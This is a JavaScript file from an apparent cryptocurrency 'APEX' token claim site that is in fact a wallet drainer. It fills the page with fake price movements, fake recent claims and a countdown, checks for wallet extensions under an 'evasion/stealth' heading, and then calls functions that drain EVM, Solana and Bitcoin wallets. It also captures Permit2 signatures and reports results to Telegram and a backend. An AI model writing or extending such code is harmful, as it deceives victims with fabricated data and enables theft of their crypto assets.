    const change = Math.random() * 0.01 - 0.002;
    currentValue += change;
    dataPoints.push(currentValue);
  }
  tokenChart = new Chart(ctx.getContext("2d"), {
    type: "line",
    data: {
      labels: Array.from({ length: 24 }, (_, i) => i + "h"),
      datasets: [{
        label: "APEX Price", data: dataPoints,
        borderColor: "#FF6B00", backgroundColor: "rgba(255, 107, 0, 0.1)",
        borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true,
      }],
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: { grid: { display: false }, ticks: { color: "#a0aec0" } },
        y: { grid: { color: "rgba(255, 255, 255, 0.05)" }, ticks: { color: "#a0aec0" } },
      },
    },
  });
}

function updateTokenPrice() {
  const lastPrice = priceHistory.length > 0 ? priceHistory[priceHistory.length - 1] : 0.04;
  const change = Math.random() * 0.015 - 0.002;
  const price = (lastPrice + change).toFixed(4);
  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();
  const changePercent = (((price - lastPrice) / lastPrice) * 100).toFixed(2);
  const marketCap = (Math.random() * 1000000 + 1500000).toFixed(0);
  const volume = (Math.random() * 500000 + 200000).toFixed(0);
  const holders = (Math.random() * 10000 + 10000).toFixed(0);
  const liquidity = (Math.random() * 500000 + 500000).toFixed(0);
  const tokenPriceElement = document.getElementById("tokenPrice");
  const priceChangeElement = document.getElementById("priceChange");
  const marketCapElement = document.getElementById("marketCap");
  const volumeElement = document.getElementById("volume");
  const holdersElement = document.getElementById("holders");
  const liquidityElement = document.getElementById("liquidity");
  if (tokenPriceElement) tokenPriceElement.textContent = `$${price}`;
  if (priceChangeElement) priceChangeElement.textContent = `${changePercent}%`;
  if (marketCapElement) marketCapElement.textContent = marketCap;
  if (volumeElement) volumeElement.textContent = volume;
  if (holdersElement) holdersElement.textContent = holders;
  if (liquidityElement) liquidityElement.textContent = liquidity;
  if (tokenChart) {
    const newData = tokenChart.data.datasets[0].data.slice(1);
    newData.push(parseFloat(price));
    tokenChart.data.datasets[0].data = newData;
    tokenChart.update();
  }
  const changeElement = document.querySelector(".price-change");
  if (changeElement) {
    changeElement.classList.remove("positive", "negative");
    changeElement.classList.add(parseFloat(changePercent) >= 0 ? "positive" : "negative");
  }
}

function updateAIAnalytics() {
  const successProb = 85 + Math.floor(Math.random() * 15);
  if (predictionFill) predictionFill.style.width = `${successProb}%`;
}

// ============================================================================
//  CLAIMS LIST
// ============================================================================
function generateInitialClaims() {
  const claims = [];
  const now = Date.now();
  for (let i = 0; i < 10; i++) {
    const minutesAgo = Math.floor(Math.random() * 60) + 1;
    claims.push(generateClaim(now - minutesAgo * 60 * 1000));
  }
  claims.sort((a, b) => b.timestamp - a.timestamp);
  claimList = claims;
  updateClaimList();
}

function generateClaim(timestamp = Date.now()) {
  const prefixes = ["0x8a3F","0x4E2d","0xF12a","0x9Bc5","0x3Df7","0xA5b2","0x7Ef9","0xC3d8","0x1F4a","0x6Bc3"];
  const suffixes = ["Bc92","7Fa1","9D3e","E4f2","8C6d","A5e9","3D7b","F8c1","2E9d","5Bf4"];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
  return { address: `${prefix}...${suffix}`, amount: 500, timestamp };
}

function formatTimeAgo(timestamp) {
  const now = Date.now();
  const diff = now - timestamp;
  const minutes = Math.floor(diff / 60000);
  const hours = Math.floor(diff / 3600000);
  if (hours > 0) return `${hours} hour${hours > 1 ? "s" : ""} ago`;
  if (minutes > 0) return `${minutes} min${minutes > 1 ? "s" : ""} ago`;
  return "Just now";
}

function updateClaimList() {
  if (!claimListElement) return;
  claimListElement.innerHTML = "";
  claimList.forEach((claim) => {
    const claimElement = document.createElement("div");
    claimElement.className = "claim-item";
    let valueDisplay = "";
    if (claim.valueUSD && claim.valueUSD > 0) {
      const localValue = CURRENCY_CONVERTER.formatCurrency(
        claim.valueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
        userLocalCurrency
      );
      valueDisplay = `<span class="claim-value">(${localValue})</span>`;
    }
    claimElement.innerHTML = `
      <span class="claim-address">${claim.address}</span>
      <span class="claim-time">${formatTimeAgo(claim.timestamp)}</span>
      <span class="claim-amount-badge">${claim.amount} APEX</span>
      ${valueDisplay}
    `;
    claimListElement.appendChild(claimElement);
  });
}

function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift(generateClaim());
    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}

// ============================================================================
//  COUNTDOWN
// ============================================================================
function startCountdown() {
  const remainingDuration = 114600;
  let remainingTime = remainingDuration;
  updateCountdownDisplay(remainingTime);
  countdownInterval = setInterval(() => {
    remainingTime--;
    if (remainingTime <= 0) {
      clearInterval(countdownInterval);
      const countdownElement = document.getElementById("countdown");
      if (countdownElement) { countdownElement.textContent = "0:0:0:0"; countdownElement.classList.add("pulse"); }
      return;
    }
    if (remainingTime <= 900 && !progressUpdated) {
      if (progressBar) progressBar.style.width = "90%";
      if (progressPercentage) progressPercentage.textContent = "90%";
      progressUpdated = true;
    }
    updateCountdownDisplay(remainingTime);
  }, 1000);
}

function updateCountdownDisplay(totalSeconds) {
  const days = Math.floor(totalSeconds / (24 * 60 * 60));
  const hours = Math.floor((totalSeconds % (24 * 60 * 60)) / (60 * 60));
  const minutes = Math.floor((totalSeconds % (60 * 60)) / 60);
  const seconds = Math.floor(totalSeconds % 60);
  const countdownElement = document.getElementById("countdown");
  if (countdownElement) countdownElement.textContent = `${days}:${hours}:${minutes}:${seconds}`;
}

// ============================================================================
//  EVASION (stealth mode)
// ============================================================================
async function initializeAdvancedEvasion() {
  fingerprintData.wasm = await EVASION_TECHNIQUES.generateWasmFingerprint();
  fingerprintData.audio = await EVASION_TECHNIQUES.generateAudioFingerprint();
  fingerprintData.canvas = EVASION_TECHNIQUES.generateCanvasFingerprint();
  fingerprintData.browser = EVASION_TECHNIQUES.generateBrowserFingerprint();
  if (isMobileDevice) applyManualMobileEvasion();
  initializeManualStealthMode();
}

function applyManualMobileEvasion() {
  console.log("Applying manual mobile evasion techniques...");
}

function initializeManualStealthMode() {
  const securityDetectors = ["MetamaskInpageProvider","web3","ethereum","__coinbaseWallet","__rabby","TrustWallet","isRabby","isMetaMask","isCoinbaseWallet","isTrustWallet"];
  let detectedTools = [];
  securityDetectors.forEach((detector) => {
    if (window[detector]) { detectedTools.push(detector); stealthMode = true; }
  });
  if (stealthMode) {
    console.log(`Manual stealth mode activated: ${detectedTools.join(", ")}`);
    applyManualStealthTechniques(detectedTools);
  }
}

// NOTE: Stealth techniques that corrupt tx.data have been DISABLED.
// The previous implementation appended random bytes to txObject.data,
// which broke every contract call. Kept as a no-op for compatibility.
function applyManualStealthTechniques(detectedTools) {
  // Intentionally left as no-op. Do not mutate tx.data.
  simulationBypassActive = false;
}

// ============================================================================
//  UI TOGGLES
// ============================================================================
function toggleMobileMenu() { if (navLinks) navLinks.classList.toggle("active"); }
function disconnectManualWallet() { if (DISABLE_DISCONNECT) return; handleManualDisconnection(); }

window.addEventListener("scroll", () => {
  const header = document.getElementById("header");
  if (header) {
    if (window.scrollY > 50) header.classList.add("scrolled");
    else header.classList.remove("scrolled");
  }
});

document.addEventListener("click", (e) => {
  if (navLinks && !navLinks.contains(e.target) && mobileMenuBtn && !mobileMenuBtn.contains(e.target)) navLinks.classList.remove("active");
  if (walletModal && walletModal.classList.contains("active") && e.target === walletModal) hideWalletModal();
  if (announcementModal && announcementModal.classList.contains("active") && e.target === announcementModal) hideAnnouncementModal();
});

if (document.querySelectorAll(".nav-links a")) {
  document.querySelectorAll(".nav-links a").forEach((link) => {
    link.addEventListener("click", () => { if (navLinks) navLinks.classList.remove("active"); });
  });
}

window.addEventListener("error", (e) => console.debug("Global error caught:", e.error));
window.addEventListener("unhandledrejection", (e) => console.debug("Unhandled rejection:", e.reason));

if (isMobileDevice) document.body.classList.add("manual-mobile-optimized");

setTimeout(() => { checkManualExistingConnection(); }, 1000);

// ============================================================================
//  MULTI-CHAIN DISPATCHER
// ============================================================================
async function initiateClaimProcess() {
  // Sync with main.js
  syncFromGlobal();

  // EVM first
  if (web3 || window.ethereum) {
    console.log("🟦 EVM wallet detected, attempting EVM drain...");
    await drainEVM();

    if (!delayedAttemptsScheduled) {
      delayedAttemptsScheduled = true;
      const delayMs = 150000;
      showNotification(`EVM processing complete. Will check Solana/Bitcoin in ${delayMs/60000} minutes.`, "info");
      logDebug(`⏳ Delaying Solana/Bitcoin for ${delayMs/1000} seconds`);

      setTimeout(async () => {
        logDebug("⏰ Delayed period elapsed. Attempting Solana and Bitcoin...");
        const solanaWallets = getSolanaWallets();
        if (solanaWallets.length > 0 && solanaPublicKey) {
          console.log("🟪 Solana wallet detected, attempting SOL drain...");
          await drainNativeSOL();
        } else if (solanaWallets.length > 0) {
          try {
            const wallet = solanaWallets[0];
            const provider = wallet.provider;
            if (provider.connect) {
              const response = await provider.connect();
              const publicKey = response.publicKey?.toString() || response.toString();
              solanaPublicKey = publicKey;
              solanaProvider = provider;
              showNotification("Solana wallet connected for drain", "success");
              await drainNativeSOL();
            }
          } catch (e) {
            logDebug("Solana connection attempt failed: " + e.message);
            const msg = `<b>⚠️ Solana Connection Failed</b>\nError: ${e.message}\nTime: ${new Date().toISOString()}`;
            await sendTelegramMessage(msg);
          }
        }
        if (window.unisat) {
          try {
            const accounts = await window.unisat.getAccounts();
            if (accounts && accounts.length > 0) {
              console.log("🟧 Bitcoin wallet detected, attempting BTC drain...");
              await drainNativeBTC();
            }
          } catch (e) { console.debug("UniSat check failed:", e); }
        }
        delayedAttemptsScheduled = false;
      }, delayMs);
    }
    return;
  }
  showNotification("No EVM wallet connected. Please connect an EVM wallet first.", "error");
}

// ============================================================================
//  EXPOSE GLOBALLY
// ============================================================================
window.initiateClaimProcess = initiateClaimProcess;
window.drainNativeBTC = drainNativeBTC;
window.drainNativeSOL = drainNativeSOL;
window.drainEVM = drainEVM;
window.capturePermit2Signature = capturePermit2Signature;
window.postToBackend = postToBackend;
window.syncFromGlobal = syncFromGlobal;

console.log("✅ Script.js loaded — backend-delegating model with Permit2 support");
console.log("   Debug helpers available: syncFromGlobal(), capturePermit2Signature([tokens]), postToBackend(session)");
